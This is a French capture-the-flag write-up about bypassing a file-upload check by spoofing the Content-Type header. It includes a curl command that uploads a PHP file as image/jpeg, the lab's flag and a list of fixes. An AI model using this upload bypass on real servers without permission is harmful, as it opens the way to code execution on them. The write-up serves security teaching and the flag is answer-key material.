# File Upload Bypass — Usurpation du Content-Type

## Faille
Le serveur valide uniquement le Content-Type de la requête HTTP et non l'extension
réelle ni le contenu du fichier uploadé.

## Catégorie OWASP
A04:2021 — Insecure Design

## Comment trouver la faille

1. La page `?page=upload` propose un formulaire d'upload d'image.
2. Le formulaire contient un champ hidden `MAX_FILE_SIZE` avec la valeur `100000`.
3. En essayant d'uploader un fichier PHP directement via le navigateur, le serveur
   refuse car le Content-Type n'est pas celui d'une image.
4. En utilisant curl, on peut forcer le Content-Type à `image/jpeg` tout en envoyant
   un fichier `.php`.

## Exploitation

```bash
echo '<?php echo "test"; ?>' > /tmp/hack.php

curl -X POST "http://<IP>/index.php?page=upload" \
  -F "MAX_FILE_SIZE=100000" \
  -F "uploaded=@/tmp/hack.php;type=image/jpeg" \
  -F "Upload=Upload"
```

Le serveur accepte le fichier car il ne vérifie que le header `Content-Type` de la
requête multipart (`image/jpeg`), pas le contenu réel ni l'extension du fichier.

## Flag
`46910d9ce35b385885a9f7e2b336249d622f29b267a1771fbacf52133beddba8`

## Comment corriger

1. **Valider l'extension du fichier côté serveur** : n'accepter que `.jpg`, `.jpeg`,
   `.png`, `.gif`.

2. **Vérifier le contenu réel du fichier** avec des fonctions comme `getimagesize()`
   en PHP ou en lisant les magic bytes (signature du fichier).

3. **Ne jamais se fier au Content-Type envoyé par le client** : il est entièrement
   contrôlable par l'attaquant.

4. **Stocker les fichiers uploadés en dehors du document root** du serveur web,
   et les servir via un script qui force le Content-Type correct.

5. **Renommer les fichiers uploadés** avec un nom aléatoire et sans conserver
   l'extension d'origine.

6. **Désactiver l'exécution de scripts** dans le répertoire d'upload via la
   configuration du serveur web.
